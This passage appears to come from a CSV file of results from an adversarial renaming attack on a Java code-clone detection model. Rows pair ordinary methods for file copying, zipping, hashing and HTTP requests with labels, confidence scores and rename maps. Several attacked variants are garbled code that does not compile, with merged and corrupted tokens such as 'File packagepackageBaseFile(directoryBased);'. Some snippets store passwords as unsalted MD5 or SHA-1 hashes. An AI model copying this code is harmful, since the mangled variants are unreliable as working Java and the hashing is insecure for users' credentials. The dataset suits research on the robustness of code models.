                        subdir.mkdir();
                        dir = subdir;
                    }
                }
                first_entry = false;
            }
            if (entry.isDirectory()) {
                FileUtils.forceMkdir(new File(dir + File.separator + entry.getName()));
            } else {
                File outfile = new File(dir + File.separator + entry.getName());
                File outdir = new File(outfile.getAbsolutePath().substring(0, outfile.getAbsolutePath().length() - outfile.getName().length()));
                if (!outdir.exists()) FileUtils.forceMkdir(outdir);
                FileOutputStream fo = new FileOutputStream(outfile);
                BufferedOutputStream bos = new BufferedOutputStream(fo, BUFFER);
                int read;
                byte data[] = new byte[BUFFER];
                while ((read = in.read(data, 0, BUFFER)) != -1) {
                    read_position++;
                    bos.write(data, 0, read);
                }
                bos.flush();
                bos.close();
            }
        }
        in.close();
    }
",335,"    public static void process(String PackageNames, ArrayList<byte[]> fileHours, ArrayList<String> playContents) throws Exception {
        String ddirectoryBased= Util.JAVA_DIR + File.separator + PackageNames;
        File packagepackageBaseFile(directoryBased);
        if (!packageBase.exists()) {
            boolean ccreated= packageBase.mkdir();
            if (!created) {
                File currentDirectory = new File(""."");
                throw new Exception(""Directory "" + PackageNames + "" could not be created. Current directory: "" + currentDirectory.getAbsolutePath());
            }
        }
        for (iiit i = ii; i < fileHours.size(); ii++) {
            File filepeew File(Util.JAVA_DIR + File.separator + playContents.get(ii));
            FileOutputStreafopsos = new FileOutputStream(pe);
          fopsos.write(fileHours.get(ii));
            fops.flush();
            fops.close();
        }
        for (int i =ii0; i <iiplayContents.size(); ii++) {
            File filefileDourceew File(Util.JAVA_DIR + File.separator + playContents.get(ii));
            File fileDst = nfileFsc(dirdirectoryBasedFile.separator + playContents.get(ii));
            BufferedReader reareadernew BufferedReader(new FileReader(fileDource));
            BufferedWriter book = new BufferedWriter(new FileWriter(fileFsc));
            wbookappend(""package "" + PackageNames + "";
"");
            String url = """";
            while urlne = reader.readLine()) != null) book.append(url + ""
"");
            book.flush();
            book.close();
            reader.close();
        }
    }
",LABEL_1,LABEL_1,0.5106920003890991,1,"save,packageName,fileContents,fileNames,dirBase,packageDir,created,currentPath,i,file,fos,fileSrc,fileDst,reader,writer,line",,,,5,"save:process,packageName:PackageNames,fileContents:fileHours,fileNames:playContents,dirBase:directoryBased,packageDir:packageBase,created:created,currentPath:currentDirectory,i:ii,file:pe,fos:fops,fileSrc:fileDource,fileDst:fileFsc,reader:reader,writer:book,line:url,",2,GA,1129,0.42722349564234413,ga,[]
426,"    public void run(IAction action) {
        int style = PlatformUI.getWorkbench().getActiveWorkbenchWindow().getShell().getStyle();
        Shell shell = new Shell((style & SWT.MIRRORED) != 0 ? SWT.RIGHT_TO_LEFT : SWT.NONE);
        GraphicalViewer viewer = new ScrollingGraphicalViewer();
        viewer.createControl(shell);
        viewer.setEditDomain(new DefaultEditDomain(null));
        viewer.setRootEditPart(new ScalableFreeformRootEditPart());
        viewer.setEditPartFactory(new TableEditPartFactory());
        viewer.setContents(getContents());
        viewer.flush();
        int printMode = new PrintModeDialog(shell).open();
        if (printMode == -1) return;
        PrintDialog dialog = new PrintDialog(shell, SWT.NULL);
        PrinterData data = dialog.open();
        if (data != null) {
            PrintGraphicalViewerOperation op = new PrintGraphicalViewerOperation(new Printer(data), viewer);
            op.setPrintMode(printMode);
            op.run(selectedFile.getName());
        }
    }
 <SPLIT>     public static void copyFile(String fromPath, String toPath) {
        try {
            File inputFile = new File(fromPath);
            String dirImg = (new File(toPath)).getParent();
            File tmp = new File(dirImg);
            if (!tmp.exists()) {
                tmp.mkdir();
            }
            File outputFile = new File(toPath);
            if (!inputFile.getCanonicalPath().equals(outputFile.getCanonicalPath())) {
                FileInputStream in = new FileInputStream(inputFile);
                FileOutputStream out = new FileOutputStream(outputFile);
                int c;
                while ((c = in.read()) != -1) out.write(c);
                in.close();
                out.close();
            }
        } catch (Exception ex) {
            ex.printStackTrace();
            LogHandler.log(ex.getMessage(), Level.INFO, ""LOG_MSG"", isLoggingEnabled());
        }
    }
",202,"    public void input(IAction app) {
        int file = PlatformUI.getWorkbench().getActiveWorkbenchWindow().getShell().getStyle();
        Shellchildl = new Shell((file & SWT.MIRRORED) != 0 ? SWT.RIGHT_TO_LEFT : SWT.NONE);
        GraphicalViewer displayitter = new ScrollingGraphicalViewer();
        displayitter.createControl(child);
        displayitter.setEditDomain(new DefaultEditDomain(null));
        displayitter.setRootEditPart(new ScalableFreeformRootEditPart());
        displayitter.setEditPartFactory(new TableEditPartFactory());
        displayitter.setContents(getContents());
        displayitter.flush();
        int writeMode = new PrintModeDialog(child).open();
        if (writeMode == -1) return;
        PrintDialog logink = new PrintDialog(child, SWT.NULL);
        PrinterData entry = logink.open();
        if (entry != null) {
            PrintGraphicalViewerOperation op = neopenPrintGraphicalViewerOperation(new Printer(data),entryplayitter);
            open.setPrintMode(writeMode);
            opopennput(selectedFile.getName());
        }
    }
",LABEL_0,LABEL_0,0.5027208924293518,1,"run,action,style,shell,viewer,printMode,dialog,data,op",,,,0,"run:input,action:app,style:file,shell:child,viewer:displayitter,printMode:writeMode,dialog:logink,data:entry,op:open,",0,GA,997,0.3619980216026306,ga,[]
427,"    public BufferedWriter createOutputStream(String inFile, String outFile) throws IOException {
        int k_blockSize = 1024;
        int byteCount;
        char[] buf = new char[k_blockSize];
        File ofp = new File(outFile);
        ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(ofp));
        zos.setMethod(ZipOutputStream.DEFLATED);
        OutputStreamWriter osw = new OutputStreamWriter(zos, ""ISO-8859-1"");
        BufferedWriter bw = new BufferedWriter(osw);
        ZipEntry zot = null;
        File ifp = new File(inFile);
        ZipInputStream zis = new ZipInputStream(new FileInputStream(ifp));
        InputStreamReader isr = new InputStreamReader(zis, ""ISO-8859-1"");
        BufferedReader br = new BufferedReader(isr);
        ZipEntry zit = null;
        while ((zit = zis.getNextEntry()) != null) {
            if (zit.getName().equals(""content.xml"")) {
                continue;
            }
            zot = new ZipEntry(zit.getName());
            zos.putNextEntry(zot);
            while ((byteCount = br.read(buf, 0, k_blockSize)) >= 0) bw.write(buf, 0, byteCount);
            bw.flush();
            zos.closeEntry();
        }
        zos.putNextEntry(new ZipEntry(""content.xml""));
        bw.flush();
        osw = new OutputStreamWriter(zos, ""UTF8"");
        bw = new BufferedWriter(osw);
        return bw;
    }
 <SPLIT>     public void test() throws Exception {
        StorageStringWriter s = new StorageStringWriter(2048, ""UTF-8"");
        s.addText(""Test"");
        try {
            s.getOutputStream();
            fail(""Should throw IOException as method not supported."");
        } catch (IOException e) {
        }
        s.getWriter().write(""ing is important"");
        s.close(ResponseStateOk.getInstance());
        assertEquals(""Testing is important"", s.getText());
        InputStream input = s.getInputStream();
        StringWriter writer = new StringWriter();
        IOUtils.copy(input, writer, ""UTF-8"");
        assertEquals(""Testing is important"", writer.toString());
        try {
            s.getWriter();
            fail(""Should throw IOException as storage is closed."");
        } catch (IOException e) {
        }
    }
",279,,LABEL_1,LABEL_1,LABEL_1,-1,"createOutputStream,inFile,outFile,k_blockSize,byteCount,buf,ofp,zos,osw,bw,zot,ifp,zis,isr,br,zit",,,,0,,0,GA,5744,2.097216816743215,failed,[]
428,"    public static void compressWithZip(Vector fileList, String zipFileName) throws IOException {
        if (fileList == null || fileList.size() == 0) return;
        FileOutputStream fos = new FileOutputStream(zipFileName);
        ZipOutputStream zos = new ZipOutputStream(fos);
        Iterator iter = fileList.iterator();
        while (iter.hasNext()) {
            String fileName = (String) iter.next();
            int ind = Math.max(fileName.lastIndexOf('/'), fileName.lastIndexOf('\\'));
            String shortName = ""unknown"";
            if (ind < fileName.length() - 1) shortName = fileName.substring(ind + 1);
            zos.putNextEntry(new ZipEntry(shortName));
            FileInputStream fis = new FileInputStream(fileName);
            byte[] buf = new byte[10000];
            int bytesRead;
            while ((bytesRead = fis.read(buf)) > 0) zos.write(buf, 0, bytesRead);
            fis.close();
            zos.closeEntry();
        }
        zos.close();
    }
 <SPLIT>     public Converter(String input, String output) {
        try {
            FileInputStream fis = new FileInputStream(new File(input));
            BufferedReader in = new BufferedReader(new InputStreamReader(fis, ""SJIS""));
            FileOutputStream fos = new FileOutputStream(new File(output));
            BufferedWriter out = new BufferedWriter(new OutputStreamWriter(fos, ""UTF8""));
            int len = 80;
            char buf[] = new char[len];
            int numRead;
            while ((numRead = in.read(buf, 0, len)) != -1) out.write(buf, 0, numRead);
            out.close();
            in.close();
        } catch (IOException e) {
            System.out.println(""An I/O Exception Occurred: "" + e);
        }
    }
",211,,LABEL_1,LABEL_1,LABEL_1,-1,"compressWithZip,fileList,zipFileName,fos,zos,iter,fileName,ind,shortName,fis,buf,bytesRead",,,,0,,0,GA,3923,1.4197585781415303,failed,[]
429,"    public static void compressWithZip(Vector fileList, String zipFileName) throws IOException {
        if (fileList == null || fileList.size() == 0) return;
        FileOutputStream fos = new FileOutputStream(zipFileName);
        ZipOutputStream zos = new ZipOutputStream(fos);
        Iterator iter = fileList.iterator();
        while (iter.hasNext()) {
            String fileName = (String) iter.next();
            int ind = Math.max(fileName.lastIndexOf('/'), fileName.lastIndexOf('\\'));
            String shortName = ""unknown"";
            if (ind < fileName.length() - 1) shortName = fileName.substring(ind + 1);
            zos.putNextEntry(new ZipEntry(shortName));
            FileInputStream fis = new FileInputStream(fileName);
            byte[] buf = new byte[10000];
            int bytesRead;
            while ((bytesRead = fis.read(buf)) > 0) zos.write(buf, 0, bytesRead);
            fis.close();
            zos.closeEntry();
        }
        zos.close();
    }
 <SPLIT>     public HttpResponse executeHttpRequest(HttpRequestBase httpRequest) {
        HttpResponse response = null;
        try {
            HttpParams httpParams = new BasicHttpParams();
            HttpConnectionParams.setConnectionTimeout(httpParams, maxTime);
            HttpConnectionParams.setSoTimeout(httpParams, maxTime);
            httpclient = new DefaultHttpClient(httpParams);
            response = httpclient.execute(httpRequest);
            maxTime = 15000;
        } catch (Exception e) {
        }
        return response;
    }
",211,,LABEL_0,LABEL_0,LABEL_0,-1,"compressWithZip,fileList,zipFileName,fos,zos,iter,fileName,ind,shortName,fis,buf,bytesRead",,,,0,,0,GA,4424,1.5856572071711221,failed,[]
430,"    public static void main(String[] args) throws FileNotFoundException {
        if (args.length < 2) throw new IllegalArgumentException();
        String fnOut = args[args.length - 1];
        PrintWriter writer = new PrintWriter(fnOut);
        for (int i = 0; i < args.length - 1; i++) {
            File fInput = new File(args[i]);
            Scanner in = new Scanner(fInput);
            while (in.hasNext()) {
                writer.println(in.nextLine());
            }
        }
        writer.close();
    }
 <SPLIT>     public void transport(File file) throws TransportException {
        if (file.exists()) {
            if (file.isDirectory()) {
                File[] files = file.listFiles();
                for (int i = 0; i < files.length; i++) {
                    transport(file);
                }
            } else if (file.isFile()) {
                try {
                    FileChannel inChannel = new FileInputStream(file).getChannel();
                    FileChannel outChannel = new FileOutputStream(destinationDir).getChannel();
                    inChannel.transferTo(0, inChannel.size(), outChannel);
                } catch (IOException e) {
                    log.error(""File transfer failed"", e);
                }
            }
        }
    }
",118,,LABEL_1,LABEL_1,LABEL_1,-1,"fnOut,writer,i,fInput,in",,,,0,,0,GA,1885,0.6687188665072124,failed,[]
431,"    public APIResponse delete(String id) throws Exception {
        APIResponse response = new APIResponse();
        connection = (HttpURLConnection) new URL(url + ""/api/variable/delete/"" + id).openConnection();
        connection.setRequestMethod(""DELETE"");
        connection.setConnectTimeout(TIMEOUT);
        connection.connect();
        if (connection.getResponseCode() == HttpURLConnection.HTTP_OK) {
            response.setDone(true);
            response.setMessage(""Variable Deleted!"");
        } else {
            response.setDone(false);
            response.setMessage(""Delete Variable Error Code: Http ("" + connection.getResponseCode() + "")"");
        }
        connection.disconnect();
        return response;
    }
 <SPLIT>     private String makeLoginRequest(URL url) throws IOException {
        HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection();
        urlConnection.setRequestMethod(""POST"");
        urlConnection.setDoInput(true);
        urlConnection.setDoOutput(true);
        urlConnection.setUseCaches(false);
        urlConnection.setRequestProperty(""Content-Type"", ""application/x-www-form-urlencoded"");
        StringBuilder content = new StringBuilder();
        content.append(""Email="").append(URLEncoder.encode(EMAIL, ""UTF-8""));
        content.append(""&Passwd="").append(URLEncoder.encode(PASSWORD, ""UTF-8""));
        content.append(""&service="").append(URLEncoder.encode(SERVICE, ""UTF-8""));
        content.append(""&source="").append(URLEncoder.encode(""Google Base data API"", ""UTF-8""));
        OutputStream outputStream = urlConnection.getOutputStream();
        outputStream.write(content.toString().getBytes(""UTF-8""));
        outputStream.close();
        int responseCode = urlConnection.getResponseCode();
        InputStream inputStream;
        if (responseCode == HttpURLConnection.HTTP_OK) {
            inputStream = urlConnection.getInputStream();
        } else {
            inputStream = urlConnection.getErrorStream();
        }
        return toString(inputStream);
    }
",131,,LABEL_0,LABEL_0,LABEL_0,-1,"delete,id,response,connection",,,,0,,0,GA,1553,0.5595126390457154,failed,[]
432,"    public static byte[] hash(final byte[] saltBefore, final String content, final byte[] saltAfter, final int repeatedHashingCount) throws NoSuchAlgorithmException, UnsupportedEncodingException {
        if (content == null) return null;
        final MessageDigest digest = MessageDigest.getInstance(DIGEST);
        if (digestLength == -1) digestLength = digest.getDigestLength();
        for (int i = 0; i < repeatedHashingCount; i++) {
            if (i > 0) digest.update(digest.digest());
            digest.update(saltBefore);
            digest.update(content.getBytes(WebCastellumFilter.DEFAULT_CHARACTER_ENCODING));
            digest.update(saltAfter);
        }
        return digest.digest();
    }
 <SPLIT>     public static String encodePassword(String _originalPassword) {
        MessageDigest md = null;
        String encodedPassword = null;
        try {
            md = MessageDigest.getInstance(""SHA-1"");
            md.update(_originalPassword.getBytes(""UTF-8""));
            encodedPassword = (new BASE64Encoder()).encode(md.digest());
        } catch (NoSuchAlgorithmException _e) {
            _e.printStackTrace();
        } catch (UnsupportedEncodingException _e) {
            _e.printStackTrace();
        }
        return encodedPassword;
    }
",137,,LABEL_1,LABEL_1,LABEL_1,-1,"hash,saltBefore,content,saltAfter,repeatedHashingCount,digest,digestLength,i",,,,0,,0,GA,2968,1.0547365268071494,failed,[]
433,"    private static void main(String[] args) {
        try {
            File f = new File(""test.txt"");
            if (f.exists()) {
                throw new IOException(f + "" already exists.  I don't want to overwrite it."");
            }
            StraightStreamReader in;
            char[] cbuf = new char[0x1000];
            int read;
            int totRead;
            FileOutputStream out = new FileOutputStream(f);
            for (int i = 0x00; i < 0x100; i++) {
                out.write(i);
            }
            out.close();
            in = new StraightStreamReader(new FileInputStream(f));
            for (int i = 0x00; i < 0x100; i++) {
                read = in.read();
                if (read != i) {
                    System.err.println(""Error: "" + i + "" read as "" + read);
                }
            }
            in.close();
            in = new StraightStreamReader(new FileInputStream(f));
            totRead = in.read(cbuf);
            if (totRead != 0x100) {
                System.err.println(""Simple buffered read did not read the full amount: 0x"" + Integer.toHexString(totRead));
            }
            for (int i = 0x00; i < totRead; i++) {
                if (cbuf[i] != i) {
                    System.err.println(""Error: 0x"" + i + "" read as 0x"" + cbuf[i]);
                }
            }
            in.close();
            in = new StraightStreamReader(new FileInputStream(f));
            totRead = 0;
            while (totRead <= 0x100 && (read = in.read(cbuf, totRead, 0x100 - totRead)) > 0) {
                totRead += read;
            }
            if (totRead != 0x100) {
                System.err.println(""Not enough read. Bytes read: "" + Integer.toHexString(totRead));
            }
            for (int i = 0x00; i < totRead; i++) {
                if (cbuf[i] != i) {
                    System.err.println(""Error: 0x"" + i + "" read as 0x"" + cbuf[i]);
                }
            }
            in.close();
            in = new StraightStreamReader(new FileInputStream(f));
            totRead = 0;
            while (totRead <= 0x100 && (read = in.read(cbuf, totRead + 0x123, 0x100 - totRead)) > 0) {
                totRead += read;
            }
            if (totRead != 0x100) {
                System.err.println(""Not enough read. Bytes read: "" + Integer.toHexString(totRead));
            }
            for (int i = 0x00; i < totRead; i++) {
                if (cbuf[i + 0x123] != i) {
                    System.err.println(""Error: 0x"" + i + "" read as 0x"" + cbuf[i + 0x123]);
                }
            }
            in.close();
            in = new StraightStreamReader(new FileInputStream(f));
            totRead = 0;
            while (totRead <= 0x100 && (read = in.read(cbuf, totRead + 0x123, 7)) > 0) {
                totRead += read;
            }
            if (totRead != 0x100) {
                System.err.println(""Not enough read. Bytes read: "" + Integer.toHexString(totRead));
            }
            for (int i = 0x00; i < totRead; i++) {
                if (cbuf[i + 0x123] != i) {
                    System.err.println(""Error: 0x"" + i + "" read as 0x"" + cbuf[i + 0x123]);
                }
            }
            in.close();
            f.delete();
        } catch (IOException x) {
            System.err.println(x.getMessage());
        }
    }
 <SPLIT>     public boolean clonarFichero(FileInputStream rutaFicheroOrigen, String rutaFicheroDestino) {
        System.out.println("""");
        boolean estado = false;
        try {
            FileOutputStream salida = new FileOutputStream(rutaFicheroDestino);
            FileChannel canalOrigen = rutaFicheroOrigen.getChannel();
            FileChannel canalDestino = salida.getChannel();
            canalOrigen.transferTo(0, canalOrigen.size(), canalDestino);
            rutaFicheroOrigen.close();
            salida.close();
            estado = true;
        } catch (IOException e) {
            System.out.println(""No se encontro el archivo"");
            e.printStackTrace();
            estado = false;
        }
        return estado;
    }
",697,,LABEL_1,LABEL_1,LABEL_1,-1,"f,in,cbuf,read,totRead,out,i",,,,0,,0,GA,2987,1.1796501239140829,failed,[]
434,"    @Override
    public User saveUser(User user) {
        try {
            MessageDigest digest = java.security.MessageDigest.getInstance(""MD5"");
            digest.update(user.getPassword().getBytes(""UTF-8""));
            byte[] hash = digest.digest();
            BigInteger bigInt = new BigInteger(1, hash);
            String hashtext = bigInt.toString(16);
            while (hashtext.length() < 32) {
                hashtext = ""0"" + hashtext;
            }
            user.setPassword(hashtext);
            user.setDataRegjistrimit(new Date());
            return em.merge(user);
        } catch (Exception e) {
            throw new NestedException(e.getMessage(), e);
        }
    }
 <SPLIT>     public static byte[] encrypt(String x) throws Exception {
        java.security.MessageDigest d = null;
        d = java.security.MessageDigest.getInstance(""SHA-1"");
        d.reset();
        d.update(x.getBytes());
        return d.digest();
    }
",146,,LABEL_1,LABEL_1,LABEL_1,-1,"saveUser,user,digest,hash,bigInt,hashtext",,,,0,,0,GA,2232,0.7885291934013366,failed,[]
435,"    public String getSHA256Checksum(String source) {
        String checksum = """";
        try {
            MessageDigest md = MessageDigest.getInstance(""SHA-256"");
            md.update(source.getBytes());
            byte[] byteData = md.digest();
            StringBuffer sb = new StringBuffer();
            for (int i = 0; i < byteData.length; i++) {
                sb.append(Integer.toString((byteData[i] & 0xff) + 0x100, 16).substring(1));
            }
            System.out.println(""Hex format : "" + sb.toString());
            StringBuffer hexString = new StringBuffer();
            for (int i = 0; i < byteData.length; i++) {
                String hex = Integer.toHexString(0xff & byteData[i]);
                if (hex.length() == 1) {
                    hexString.append('0');
                }
                hexString.append(hex);
            }
            checksum = hexString.toString();
        } catch (NoSuchAlgorithmException ex) {
            Logger.getLogger(CMessageDigestFile.class.getName()).log(Level.SEVERE, null, ex);
        }
        return checksum;
    }
 <SPLIT>     public String md5(String plainText) throws NoSuchAlgorithmException {
        MessageDigest md = MessageDigest.getInstance(""MD5"");
        md.update(plainText.getBytes());
        byte[] digest = md.digest();
        StringBuffer hexString = new StringBuffer();
        for (int i = 0; i < digest.length; i++) {
            plainText = Integer.toHexString(0xFF & digest[i]);
            if (plainText.length() < 2) {
                plainText = ""0"" + plainText;
            }
            hexString.append(plainText);
        }
        return hexString.toString();
    }
",233,,LABEL_1,LABEL_1,LABEL_1,-1,"getSHA256Checksum,source,checksum,md,byteData,sb,i,hexString,hex",,,,0,,0,GA,3275,1.1830755670865376,failed,[]
436,"    protected void onlyFileCopy(File in, File out) throws IOException {
        FileChannel inChannel = new FileInputStream(in).getChannel();
        FileChannel outChannel = new FileOutputStream(out).getChannel();
        try {
            int maxCount = (1024 * 1024 * 64) - (1024 * 32);
            long size = inChannel.size();
            long pos = 0;
            while (pos < size) {
                pos += inChannel.transferTo(pos, maxCount, outChannel);
            }
        } catch (IOException e) {
            throw e;
        } finally {
            if (inChannel != null) inChannel.close();
            if (outChannel != null) outChannel.close();
        }
    }
 <SPLIT>     public static void copyFileChannel(File src, File dst, boolean preserveModificationTime) throws IOException {
        FileChannel inputChannel = null;
        FileChannel outputChannel = null;
        long length = 0;
        try {
            inputChannel = new FileInputStream(src).getChannel();
            length = inputChannel.size();
            outputChannel = new FileOutputStream(dst).getChannel();
            long total = 0;
            while (total < length) {
                total += inputChannel.transferTo(0, length, outputChannel);
            }
            if (preserveModificationTime) {
                dst.setLastModified(src.lastModified());
            }
        } finally {
            if (inputChannel != null) {
                inputChannel.close();
            }
            if (outputChannel != null) {
                outputChannel.close();
            }
        }
    }
",133,"    protected void  dofileProxy(File url, File image) throws IOException {
        FileChannel iInChan= new FileInputStream(url).getChannel();
        FileChannel ouintChan new FileOutputStream(image).getChannel();
        try {
            int  maxSum = (1024 * 1024 * 64) - (1024 * 32);
            loseekize = InChan.seek();
            long loc = 0;
            while (loc < seek) {
         loc    pos += InChan.transfeloc(po maxSumunt, intChan);
            }
        } catch (IOException e) {
            throw e;
        } finally {
            if (InChan != null) InChan.close();
            if (intChan != null) intChan.close();
        }
    }
",LABEL_1,LABEL_1,0.7614086866378784,1,"onlyFileCopy,in,out,inChannel,outChannel,maxCount,size,pos",,,,0,"onlyFileCopy: dofileProxy,in:url,out:image,inChannel:InChan,outChannel:intChan,maxCount: maxSum,size:seek,pos:loc,",0,GA,546,0.19696371555328368,ga,[]
437,"    private void getRandomGUID(boolean secure) {
        MessageDigest md5 = null;
        StringBuffer sbValueBeforeMD5 = new StringBuffer();
        try {
            md5 = MessageDigest.getInstance(""MD5"");
        } catch (NoSuchAlgorithmException e) {
            logger.error(""At RandomGUID !!!"", e);
        }
        try {
            long time = System.currentTimeMillis();
            long rand = 0;
            if (secure) {
                rand = mySecureRand.nextLong();
            } else {
                rand = myRand.nextLong();
            }
            sbValueBeforeMD5.append(s_id);
            sbValueBeforeMD5.append("":"");
            sbValueBeforeMD5.append(Long.toString(time));
            sbValueBeforeMD5.append("":"");
            sbValueBeforeMD5.append(Long.toString(rand));
            valueBeforeMD5 = sbValueBeforeMD5.toString();
            md5.update(valueBeforeMD5.getBytes());
            byte[] array = md5.digest();
            StringBuffer sb = new StringBuffer();
            for (int j = 0; j < array.length; ++j) {
                int b = array[j] & 0xFF;
                if (b < 0x10) sb.append('0');
                sb.append(Integer.toHexString(b));
            }
            valueAfterMD5 = sb.toString();
        } catch (Exception e) {
            logger.error(""At RandomGUID !!!"", e);
        }
    }
 <SPLIT>     private static void recurseFiles(File root, File file, ZipArchiveOutputStream zaos, boolean absolute) throws IOException {
        if (file.isDirectory()) {
            File[] files = file.listFiles();
            for (File file2 : files) {
                recurseFiles(root, file2, zaos, absolute);
            }
        } else if ((!file.getName().endsWith("".zip"")) && (!file.getName().endsWith("".ZIP""))) {
            String filename = null;
            if (absolute) {
                filename = file.getAbsolutePath().substring(root.getAbsolutePath().length());
            } else {
                filename = file.getName();
            }
            ZipArchiveEntry zae = new ZipArchiveEntry(filename);
            zae.setSize(file.length());
            zaos.putArchiveEntry(zae);
            FileInputStream fis = new FileInputStream(file);
            IOUtils.copy(fis, zaos);
            zaos.closeArchiveEntry();
        }
    }
",263,,LABEL_0,LABEL_0,LABEL_0,-1,"getRandomGUID,secure,md5,sbValueBeforeMD5,time,rand,valueBeforeMD5,array,sb,j,b,valueAfterMD5",,,,0,,0,GA,4388,1.600280753771464,failed,[]
438,"    public static void copyFileChannel(File src, File dst, boolean preserveModificationTime) throws IOException {
        FileChannel inputChannel = null;
        FileChannel outputChannel = null;
        long length = 0;
        try {
            inputChannel = new FileInputStream(src).getChannel();
            length = inputChannel.size();
            outputChannel = new FileOutputStream(dst).getChannel();
            long total = 0;
            while (total < length) {
                total += inputChannel.transferTo(0, length, outputChannel);
            }
            if (preserveModificationTime) {
                dst.setLastModified(src.lastModified());
            }
        } finally {
            if (inputChannel != null) {
                inputChannel.close();
            }
            if (outputChannel != null) {
                outputChannel.close();
            }
        }
    }
 <SPLIT>     public static void copyFile(File src, File dest) throws IOException {
        FileInputStream fis = new FileInputStream(src);
        FileOutputStream fos = new FileOutputStream(dest);
        java.nio.channels.FileChannel channelSrc = fis.getChannel();
        java.nio.channels.FileChannel channelDest = fos.getChannel();
        channelSrc.transferTo(0, channelSrc.size(), channelDest);
        fis.close();
        fos.close();
    }
",143,"    public static void transferfilechannel(File url, File stlt, boolean preserveModificationTime) throws IOException {
        FileChannel errorCache = null;
        FileChannel inputChan = null;
        long next = 0;
        try {
            errorCache = new FileInputStream(url).getChannel();
          nextth = errorCache.size();
            oinputChan= new FileOutputStream(stlt).getChannel();
            long total = 0;
            whiletotalal < next) {
        total   total += errorCache.transferTonextngth, inputChan);
            }
            if (preserveModificationTime) {
                stlt.setLastModified(url.lastModified());
            }
        } finally {
            if (errorCache != null) {
                errorCache.close();
            }
            if (inputChan != null) {
                inputChan.close();
            }
        }
    }
",LABEL_1,LABEL_1,0.5851126909255981,1,"copyFileChannel,src,dst,preserveModificationTime,inputChannel,outputChannel,length,total",,,,5,"copyFileChannel:transferfilechannel,src:url,dst:stlt,preserveModificationTime:preserveModificationTime,inputChannel:errorCache,outputChannel:inputChan,length:next,total:total,",2,GA,768,0.2739450216293335,ga,[]
439,"    public void handler(Map<String, String> result, TargetPage target) {
        try {
            URL url = new URL(target.getUrl());
            BufferedReader reader = new BufferedReader(new InputStreamReader(url.openStream()));
            String line = null;
            while ((line = reader.readLine()) != null) {
                for (Map.Entry<String, String> entry : result.entrySet()) {
                    if (line.indexOf(target.getInclude()) != -1) {
                        int fromIndex = line.indexOf(target.getFromStr());
                        String r = line.substring(fromIndex + target.getFromStr().length(), line.indexOf(target.getToStr(), fromIndex));
                        entry.setValue(r);
                        line = line.substring(line.indexOf(target.getToStr()) + target.getToStr().length());
                    }
                }
            }
            reader.close();
        } catch (MalformedURLException e) {
        } catch (IOException e) {
        }
    }
 <SPLIT>     private static void setMembers() {
        try {
            URL url = new URL(getTracUrl() + ""newticket"");
            BufferedReader reader = new BufferedReader(new InputStreamReader(url.openStream()));
            String buffer = reader.readLine();
            while (buffer != null) {
                if (buffer.contains(""<select id=\""component\"" name=\""component\"">"")) {
                    Pattern pattern = Pattern.compile("">[^<]+?<"");
                    Matcher matcher = pattern.matcher(buffer);
                    Vector<String> erg = new Vector<String>();
                    int start = 0;
                    while (matcher.find(start)) {
                        int von = matcher.start() + 1;
                        int bis = matcher.end() - 1;
                        erg.add(Recoder.recode(buffer.substring(von, bis), ""UTF-8"", Recoder.getDefaultEncoding()));
                        start = bis;
                    }
                    m_strComponents = new String[erg.size()];
                    erg.toArray(m_strComponents);
                }
                if (buffer.contains(""<select id=\""priority\"" name=\""priority\"">"")) {
                    Pattern pattern = Pattern.compile("">[^<]+?<"");
                    Matcher matcher = pattern.matcher(buffer);
                    Vector<String> erg = new Vector<String>();
                    int start = 0;
                    while (matcher.find(start)) {
                        int von = matcher.start() + 1;
                        int bis = matcher.end() - 1;
                        erg.add(Recoder.recode(buffer.substring(von, bis), ""UTF-8"", Recoder.getDefaultEncoding()));
                        start = bis;
                    }
                    m_strPriorities = new String[erg.size()];
                    erg.toArray(m_strPriorities);
                }
                buffer = reader.readLine();
            }
        } catch (MalformedURLException e) {
            System.out.println(""e1"");
        } catch (IOException e) {
            System.out.println(e);
        }
    }
",212,,LABEL_1,LABEL_1,LABEL_1,-1,"handler,result,target,url,reader,line,entry,fromIndex,r",,,,0,,0,GA,3284,1.2075674573580424,failed,[]
440,"    public void execute() {
        try {
            if (methods == null) {
                return;
            }
            List<Resource> resources = new ArrayList<Resource>();
            for (Iterator<Resource> i = classFiles.iterator(); i.hasNext(); ) {
                final Resource classFile = i.next();
                if (!classFile.getName().equals(CALLSTACK_FILE)) {
                    try {
                        InputStream inputStream = classFile.getInputStream();
                        ClassReader reader = new ClassReader(inputStream);
                        reader.accept(new MethodAnalyzer(), 0);
                        resources.add(classFile);
                        oldSize += classFile.getSize();
                    } catch (IllegalStateException e) {
                    }
                }
            }
            for (Iterator<Resource> i = resources.iterator(); i.hasNext(); ) {
                final Resource classFile = i.next();
                try {
                    InputStream inputStream = classFile.getInputStream();
                    ClassReader reader = new ClassReader(inputStream);
                    ClassWriter writer = new ClassWriter(reader, ClassWriter.COMPUTE_MAXS);
                    if (!classFile.getName().startsWith(CALLSTACK_FILE.substring(0, CALLSTACK_FILE.indexOf('.')))) {
                        reader.accept(new MethodInjector(writer), 0);
                        byte[] b = writer.toByteArray();
                        inputStream.close();
                        OutputStream outputStream = classFile.getOutputStream();
                        outputStream.write(b);
                        outputStream.close();
                        injectedClasses++;
                    }
                } catch (IllegalStateException e) {
                }
                newSize += classFile.getSize();
            }
            File classFile = new File(classFiles.getDir(), CALLSTACK_FILE);
            if (!classFile.exists()) {
                throw new BuildException(""Missing net.yura.mobile.logging.CallStack class"");
            }
            InputStream inputStream = new FileInputStream(classFile);
            ClassReader reader = new ClassReader(inputStream);
            ClassWriter writer = new ClassWriter(reader, ClassWriter.COMPUTE_MAXS);
            try {
                reader.accept(new PushMethodGenerator(writer), 0);
            } finally {
                inputStream.close();
            }
            byte[] b = writer.toByteArray();
            inputStream.close();
            OutputStream outputStream = new FileOutputStream(classFile);
            outputStream.write(b);
            outputStream.close();
            log(injectedClasses + "" classes injected"");
            log((injectedMethods * 100) / Math.max(1, totalMethods) + ""% of methods injected"");
            log((100 - ((oldSize * 100) / newSize)) + ""% code size increase"");
        } catch (IOException e) {
            log(e, 0);
        }
    }
 <SPLIT>     public static boolean decodeFileToFile(String infile, String outfile) {
        boolean success = false;
        java.io.InputStream in = null;
        java.io.OutputStream out = null;
        try {
            in = new Base64.InputStream(new java.io.BufferedInputStream(new java.io.FileInputStream(infile)), Base64.DECODE);
            out = new java.io.BufferedOutputStream(new java.io.FileOutputStream(outfile));
            byte[] buffer = new byte[65536];
